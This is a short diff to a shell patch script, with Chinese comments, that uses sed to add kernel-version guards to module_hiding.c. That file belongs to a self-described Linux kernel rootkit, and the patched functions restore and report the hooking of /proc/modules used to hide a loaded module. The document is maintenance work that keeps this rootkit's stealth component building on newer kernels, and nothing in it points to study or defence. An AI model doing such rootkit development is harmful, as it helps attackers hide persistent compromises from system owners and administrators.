@@ -68,6 +68,24 @@ sed -i '/static int hooked_proc_modules_show/i\
 sed -i '/static int hooked_proc_modules_show/a\
 #endif' module_hiding.c
 
+# 修复 module_hiding.c 中的 restore_proc_modules 函数
+sed -i.bak '/static void restore_proc_modules(void) {/,/^}$/ {
+    /static void restore_proc_modules(void) {/a\
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+    /^}$/i\
+#else\
+    printk(KERN_WARNING "[rootkit] /proc/modules restore not supported on kernel >= 5.6\\n");\
+#endif
+}' module_hiding.c
+
+# 修复 module_hiding.c 中的 get_hiding_status 函数
+sed -i.bak '/original_proc_modules_fops ? "Yes" : "No"/c\
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)\
+        original_proc_modules_fops ? "Yes" : "No"\
+#else\
+        "Not Supported"\
+#endif' module_hiding.c
+
 echo "✅ 修复完成"
 
 # 验证修复
